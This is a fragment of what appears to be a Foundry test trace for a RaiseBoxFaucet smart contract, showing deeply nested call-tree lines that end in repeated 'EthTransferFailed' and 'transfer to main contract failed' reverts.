│   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
